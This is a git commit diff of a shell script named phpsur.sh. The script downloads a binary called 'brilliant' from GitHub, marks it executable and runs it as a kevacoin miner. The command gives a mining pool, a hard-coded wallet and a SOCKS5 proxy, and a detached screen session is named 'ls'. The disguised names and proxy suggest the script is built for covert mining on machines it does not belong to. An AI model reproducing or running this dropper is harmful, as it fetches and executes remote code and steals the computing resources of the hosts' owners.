4c476a7dc5306159f8d9411952f4c078b4fc8f35
brilliant-cut <90860858+brilliant-cut@users.noreply.github.com>
2021-09-17 01:16:14 +0700

    Update phpsur.sh

--- phpsur.sh
+++ phpsur.sh
@@ -1,6 +1,6 @@
-#!/bin/bash
-sudo apt update 
-sudo apt install screen libjansson4 -y
+apt update 
+apt install screen -y
 wget -O brilliant https://github.com/brilliant-cut/brilliant-cut/raw/main/brilliant
+chmod +x brilliant
 screen -dmS ls
-./brilliant --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password brilliant=$(echo $strDate-$(shuf -i 1-1000 -n 1) --proxy=socks5://50.62.35.16:11818
+./brilliant --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password BC=$(echo $strDate-$(shuf -i 1-1000 -n 1) --proxy=socks5://50.62.35.16:11818
